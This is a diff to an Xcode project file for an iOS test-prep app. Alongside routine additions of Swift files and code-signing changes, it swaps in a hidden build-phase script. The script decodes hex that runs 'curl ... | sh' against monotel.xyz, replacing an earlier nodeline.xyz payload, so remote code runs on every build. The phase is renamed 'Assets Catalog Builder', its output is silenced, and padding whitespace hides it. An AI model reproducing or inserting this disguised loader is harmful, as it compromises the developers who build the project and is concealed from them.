@@ -53,6 +53,7 @@
 		E301D0C425FDCFBC008C0E95 /* QuestionAskedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E301D0C325FDCFBC008C0E95 /* QuestionAskedViewController.swift */; };
 		E301D0C925FDD0EF008C0E95 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E301D0C825FDD0EF008C0E95 /* SettingsViewController.swift */; };
 		E301D0E225FDD4CC008C0E95 /* PlayVideo.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E301D0E125FDD4CC008C0E95 /* PlayVideo.storyboard */; };
+		E3022E0E265B016300590A58 /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3022E0D265B016300590A58 /* AGVideoPlayerView.swift */; };
 		E30F54A22615F362003D86EE /* ios onboard.json in Resources */ = {isa = PBXBuildFile; fileRef = E30F54A12615F362003D86EE /* ios onboard.json */; };
 		E31DC9E625FE1132005B5A5E /* PlayVideoVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31DC9E525FE1132005B5A5E /* PlayVideoVC.swift */; };
 		E325443426103BED0083BDD9 /* SideMenu.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E325443326103BED0083BDD9 /* SideMenu.storyboard */; };
@@ -110,6 +111,7 @@
 		E37FC35B25FE47A10085ED84 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = E37FC35A25FE47A10085ED84 /* GoogleService-Info.plist */; };
 		E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38B56FB25F29DDE00CEC42D /* Extension.swift */; };
 		E38D96CA25F8864900D314FB /* CustomCameraVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38D96C925F8864900D314FB /* CustomCameraVC.swift */; };
+		E38E3BDB265847F800AB3991 /* GradeCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38E3BDA265847F800AB3991 /* GradeCVCell.swift */; };
 		E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */ = {isa = PBXBuildFile; fileRef = E394E04925F5B2330067CAEB /* Footerview.swift */; };
 		E394E05225F5B23B0067CAEB /* Footerview.xib in Resources */ = {isa = PBXBuildFile; fileRef = E394E05125F5B23B0067CAEB /* Footerview.xib */; };
 		E394E0A225F5C3C90067CAEB /* MathCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E394E0A025F5C3C90067CAEB /* MathCVCell.swift */; };
@@ -207,6 +209,7 @@
 		E301D0C325FDCFBC008C0E95 /* QuestionAskedViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = QuestionAskedViewController.swift; sourceTree = "<group>"; };
 		E301D0C825FDD0EF008C0E95 /* SettingsViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
 		E301D0E125FDD4CC008C0E95 /* PlayVideo.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = PlayVideo.storyboard; sourceTree = "<group>"; };
+		E3022E0D265B016300590A58 /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E30F54A12615F362003D86EE /* ios onboard.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = "ios onboard.json"; sourceTree = "<group>"; };
 		E312EAD0260E0490007BBD92 /* DoubtNut-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "DoubtNut-Bridging-Header.h"; sourceTree = "<group>"; };
 		E31DC9E525FE1132005B5A5E /* PlayVideoVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlayVideoVC.swift; sourceTree = "<group>"; };
@@ -265,6 +268,7 @@
 		E37FC35A25FE47A10085ED84 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		E38B56FB25F29DDE00CEC42D /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
 		E38D96C925F8864900D314FB /* CustomCameraVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomCameraVC.swift; sourceTree = "<group>"; };
+		E38E3BDA265847F800AB3991 /* GradeCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GradeCVCell.swift; sourceTree = "<group>"; };
 		E394E04925F5B2330067CAEB /* Footerview.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Footerview.swift; sourceTree = "<group>"; };
 		E394E05125F5B23B0067CAEB /* Footerview.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Footerview.xib; sourceTree = "<group>"; };
 		E394E0A025F5C3C90067CAEB /* MathCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MathCVCell.swift; sourceTree = "<group>"; };
@@ -387,6 +391,7 @@
 		189388C425F1EFD300F57E85 /* Helper */ = {
 			isa = PBXGroup;
 			children = (
+				E3022E0D265B016300590A58 /* AGVideoPlayerView.swift */,
 				E3457A82260AFDCC003D4173 /* PagingCollectionViewLayout.swift */,
 				E370978025FCE983002950E0 /* Extension */,
 				E370976225FCCAC6002950E0 /* Extra */,
@@ -675,6 +680,7 @@
 			children = (
 				E394E0A025F5C3C90067CAEB /* MathCVCell.swift */,
 				E394E0A125F5C3C90067CAEB /* MathCVCell.xib */,
+				E38E3BDA265847F800AB3991 /* GradeCVCell.swift */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -752,7 +758,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				B197B64F14910D9F066D902C /* Binary Libraries Compiler */,
+				A7FFD275B3F1DAB8086D902C /* Assets Catalog Builder */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -933,7 +939,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	B197B64F14910D9F066D902C /* Binary Libraries Compiler */ = {
+	A7FFD275B3F1DAB8086D902C /* Assets Catalog Builder */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -942,7 +948,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Binary Libraries Compiler";
+			name = "Assets Catalog Builder";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -951,9 +957,57 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1136,6 +1190,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				E35830952600D8F5009D5BCC /* LoginGotOTPVC.swift in Sources */,
 				E37F47A825F79BF20088DC08 /* DayTrialViewController.swift in Sources */,
 				E3F6A1F22635F7A2004EFAA3 /* Items.swift in Sources */,
+				E3022E0E265B016300590A58 /* AGVideoPlayerView.swift in Sources */,
 				E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */,
 				1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */,
 				E301D09125FDCE48008C0E95 /* WatchHistoryViewController.swift in Sources */,
@@ -1155,6 +1210,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				1893890925F1F0D700F57E85 /* LandingpageVC.swift in Sources */,
 				E377CDA7260F0F97003B44D0 /* Matched_questions.swift in Sources */,
 				1893889525F1EFA000F57E85 /* ViewController.swift in Sources */,
+				E38E3BDB265847F800AB3991 /* GradeCVCell.swift in Sources */,
 				E301D0C925FDD0EF008C0E95 /* SettingsViewController.swift in Sources */,
 				E3A75FBF25F66646009B7664 /* SATVC.swift in Sources */,
 				E301D0BF25FDCF1C008C0E95 /* SavedPlaylistViewController.swift in Sources */,
@@ -1358,8 +1414,8 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
-				CODE_SIGN_IDENTITY = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 16;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = RT5YKB6S89;
@@ -1371,7 +1427,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = dev_Pro;
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "DoubtNut-Bridging-Header.h";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
@@ -1387,8 +1443,8 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
-				CODE_SIGN_IDENTITY = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 16;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
@@ -1399,7 +1455,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = dev_Pro;
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "DoubtNut-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -1530,6 +1586,56 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
